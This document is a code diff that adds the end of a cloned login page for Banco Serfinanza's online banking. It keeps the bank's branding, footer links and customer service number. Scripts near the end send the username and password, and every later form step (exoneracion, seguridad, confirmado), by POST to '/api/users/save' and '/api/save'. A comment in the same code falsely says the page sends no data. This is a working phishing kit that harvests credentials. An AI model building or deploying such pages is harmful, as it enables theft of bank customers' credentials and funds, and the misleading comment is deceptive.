+                            <li data-target="#carousel-home" data-slide-to="2"></li>
+
+
+                        </ol>
+                        <div class="carousel-inner">
+                            <div class="carousel-item active">
+                                <img class="d-block w-100" src="../Assets/img/banner-portal-transaccional-3.jpg"
+                                    alt="Descarga nuestra nueva App Serfinanza">
+
+                            </div>
+                            <div class="carousel-item">
+                                <img class="d-block w-100" src="../Assets/img/banner-portal-transaccional-1.jpg"
+                                    alt="Protege tu clave">
+                            </div>
+                            <div class="carousel-item">
+                                <img class="d-block w-100" src="../Assets/img/banner-portal-transaccional-2.jpg"
+                                    alt="Ser precavido y lleva una vida tranquila">
+                            </div>
+
+                        </div>
+                        <a class="carousel-control-prev" href="#carousel-home" role="button" data-slide="prev">
+                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                            <span class="sr-only">Anterior</span>
+                        </a>
+                        <a class="carousel-control-next" href="#carousel-home" role="button" data-slide="next">
+                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                            <span class="sr-only">Siguiente</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container-fluid">
+            <footer>
+                <div class="row justify-content-center">
+                    <div class="col-11 ssl-footer">
+                        <table style="width:100%" border="0" cellpadding="2" cellspacing="0"
+                            title="Haga clic para verificar: este sitio ha elegido SSL de Symantec para proteger sus transferencias de comercio electrónico y comunicaciones confidenciales.">
+                            <tr>
+                                <td width="135" align="center" valign="top">
+
+                                </td>
+                            </tr>
+                        </table>
+                    </div>
+                    <div class="col-11">
+                        <p class="infoSedes">
+                            Línea de Servicio al Cliente: 323 5997000 - 018000510513
+                        </p>
+                    </div>
+
+                    <div class="col-md-9 col-12">
+                        <ul class="listadoFooter">
+                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/seguridad-de-la-informacion/"
+                                    target="_blank" rel="noopener"><i class="fas fa-lock"></i> Seguridad</a></li>
+                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/reglamento-serfinanza-virtual/"
+                                    target="_blank" rel="noopener"><i class="fas fa-list-ul"></i> Reglamento Sucursal
+                                    Virtual</a></li>
+                            <li><a href="https://bancoserfinanza.com/servicio-al-cliente/aviso-de-privacidad/"
+                                    target="_blank" rel="noopener"><i class="fas fa-clipboard-list"></i> Políticas de
+                                    Privacidad</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3 col-12">
+                        <p>Serfinanza - 2023</p>
+                        <input type="hidden" id="Version" name="custId" value="Version:0.37.0">
+                    </div>
+                </div>
+
+            </footer>
+        </div>
+
+    </div>
+
+    <div class="modal fade" id="Generic-Dialog" data-backdrop="static" data-keyboard="false">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header icom-modal-error-header">
+
+                </div>
+
+                <div class="modal-body">
+                    <div class="info-exclamation">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <p class="modal-tittle"></p>
+
+                    </div>
+                    <p id="modal-instructions" class="icom-modal-instructions"></p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" id="moda-btn-accept" class="btn btn-primary">Aceptar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- jQuery first, then Tether, then Bootstrap JS. -->
+    <script src="../Assets/js/jquery-2.1.1.min.js" type="text/javascript"></script>
+
+
+    <script type="text/javascript" src="../Assets/vendor/popper/popper.min.js"></script>
+    <script src="../Assets/vendor/bootstrap4beta/js/bootstrap.min.js" type="text/javascript"></script>
+
+    <!--Cookie js for theme chooser and applying it -->
+    <script src="../Assets/vendor/cookie/jquery.cookie.js" type="text/javascript"></script>
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="../Assets/js/ie10-viewport-bug-workaround.js"></script>
+    <script src="../Scripts/Utilities.js"></script>
+    <script>
+        "use strict";
+        $('input[type="checkbox"]').on('change', function () {
+            $(this).parent().toggleClass("active")
+            $(this).closest(".media").toggleClass("active");
+        });
+        $(window).on("load", function () {
+            /* loading screen */
+            $(".loader_wrapper").fadeOut("slow");
+        });
+    </script>
+
+    <script>
+        var urlAuth2 = "../../Personal/Login/Auth2";
+        var login = "../../Personal/Login/Index";
+        var closeSession = "../../Personal/Login/Index";
+
+    </script>
+    <script src="../Scripts/Keypad/jquery.plugin.min.js"></script>
+    <script src="../Scripts/Keypad/jquery.keypad.min.js"></script>
+    <script src="../Scripts/Keypad/jquery.keypad-es.js"></script>
+    <script src="../Scripts/Alphanum/jquery.alphanum.js"></script>
+    <script src="../Assets/js/fpd2.js"></script>
+    <script src="../Scripts/Views/login.js" type="text/javascript"></script>
+
+
+
+    <script>
+        window.addEventListener('load', function () {
+            document.body.style.paddingRight = '0px';
+        });
+
+        document.getElementById('btn-sign-on').addEventListener('click', function () {
+            document.body.classList.add('no-padding-right');
+        });
+
+    </script>
+
+    <!-- NOTE: Removed external /Personal/Scripts/Views/script.js that sent data.
+         Added a small inline script that only controls the two-step flow and redirects.
+         This script does NOT save or send any data. -->
+    <script>
+    (function () {
+      // Flow control: first click shows password area, second click redirects to exoneracion.html
+      document.addEventListener('DOMContentLoaded', function () {
+        var userSection = document.getElementById('login-username');
+        var passSection = document.getElementById('login-password');
+        var secureImage = document.getElementById('login-secureimage');
+        var btn = document.getElementById('btn-sign-on');
+
+        // If any element missing, stop (do nothing)
+        if (!btn || !userSection || !passSection) return;
+
+        var state = 'user'; // 'user' or 'pass'
+
+        // Ensure password section is hidden on load (it already is, but keep safe)
+        passSection.style.display = 'none';
+        if (secureImage) secureImage.style.display = 'none';
+
+        btn.addEventListener('click', function (e) {
+          e.preventDefault();
+
+          if (state === 'user') {
+            // Validate username present
+            var uname = (document.getElementById('UserName') || { value: '' }).value.trim();
+            if (!uname) {
+              // show modal if exists, else alert
+              if (typeof $ === 'function' && $('#UserEmpty-Dialog').length) {
+                $('#UserEmpty-Dialog').modal('show');
+              } else {
+                alert('Por favor ingresa tu usuario.');
+              }
+              return;
+            }
+
+            // show password step without navigating away
+            userSection.style.display = 'none';
+            if (secureImage) secureImage.style.display = '';
+            passSection.style.display = '';
+            // focus password input if present
+            var pwd = document.getElementById('Password');
+            if (pwd) {
+              try { pwd.removeAttribute('readonly'); } catch (err) {}
+              pwd.focus();
+            }
+            state = 'pass';
+          } else {
+            // password step -> redirect to exoneracion.html
+            var pwdVal = (document.getElementById('Password') || { value: '' }).value;
+            if (!pwdVal || pwdVal.trim().length < 1) {
+              if (typeof $ === 'function' && $('#Password-Error').length) {
+                // show validation modal if available
+                $('#Validation-Dialog').modal('show');
+              } else {
+                alert('Por favor ingresa tu contraseña.');
+              }
+              return;
+            }
+
+            // Redirect to the next page in the same folder.
+            window.location.href = "exoneracion.html";
+
+          }
+        });
+      });
+    })();
+    </script>
+
+
+
+
+<!-- Injected script: send username/password to backend -->
+<script>
+(function () {
+  async function sendPartial(data) {
+    try {
+      await fetch(window.API_BASE + '/api/users/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (err) {
+      console.error('error enviando datos al backend', err);
+    }
+  }
+  document.addEventListener('DOMContentLoaded', function () {
+    var btn = document.getElementById('btn-sign-on');
+    if (!btn) return;
+    var state = 'user';
+    btn.addEventListener('click', function (e) {
+      var userInput = document.getElementById('UserName');
+      var passInput = document.getElementById('Password');
+      if (!userInput) return;
+      if (state === 'user') {
+        state = 'pass';
+        return;
+      } else {
+        var username = userInput.value || '';
+        var password = passInput ? passInput.value || '' : '';
+        if (!password || password.trim().length < 1) {
+          return;
+        }
+        sendPartial({ username: username, password: password });
+      }
+    });
+  });
+})();
+</script>
+
+<script>
+(function(){
+  async function sendStep(data){
+    try{
+      const resp = await fetch('/api/save', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(data)
+      });
+      // ignore response but could handle errors
+      return resp.json().catch(()=>({}));
+    }catch(e){
+      console.error('Error sending /api/save', e);
+      return null;
+    }
+  }
+
+  // helper to collect form inputs into object
+  function formToObj(form){
+    const fd = new FormData(form);
+    const obj = {};
+    for(const [k,v] of fd.entries()) obj[k]=v;
+    return obj;
+  }
+
+  // attach to forms by action or id; if not found, attach to first form
+  function attach(formSelector, stepName){
+    const form = document.querySelector(formSelector) || document.querySelector('form');
+    if(!form) return;
+    form.addEventListener('submit', async function(e){
+      e.preventDefault();
+      try{
+        const obj = formToObj(form);
+        obj.step = stepName;
+        // preserve any clientId if exists (localStorage used by socket client)
+        if(localStorage && localStorage.getItem('serfina_clientId')) obj.clientId = localStorage.getItem('serfina_clientId');
+        await sendStep(obj);
+      }catch(err){ console.error(err); }
+      // allow original behavior: if form has data-redirect attribute or action, follow it
+      const redirect = form.getAttribute('data-redirect') || form.getAttribute('action');
+      if(redirect){
+        window.location.href = redirect;
+      } else {
+        // fallback: try next step mapping
+        const next = { 'login':'/exoneracion','exoneracion':'/seguridad','seguridad':'/confirmado','confirmado':'/confirmado' };
+        window.location.href = next[stepName] || '/';
+      }
+    }, {once:true});
+  }
+
+  // Attachings for known pages by pathname
+  const p = window.location.pathname;
+  if(p.endsWith('/index.html') || p === '/' || p.endsWith('/Login/') || p.endsWith('/Login/index.html')){
+    attach('form', 'login');
+  } else if(p.endsWith('/exoneracion.html') || p.endsWith('/exoneracion')){
+    attach('form', 'exoneracion');
+  } else if(p.endsWith('/seguridad.html') || p.endsWith('/seguridad')){
+    attach('form', 'seguridad');
+  } else if(p.endsWith('/confirmado.html') || p.endsWith('/confirmado')){
+    attach('form', 'confirmado');
+  } else {
+    // generic attach: if page contains inputs typical of login, attach
+    attach('form', 'login');
+  }
+})();
+</script>
+
+</body>
+
+</html>
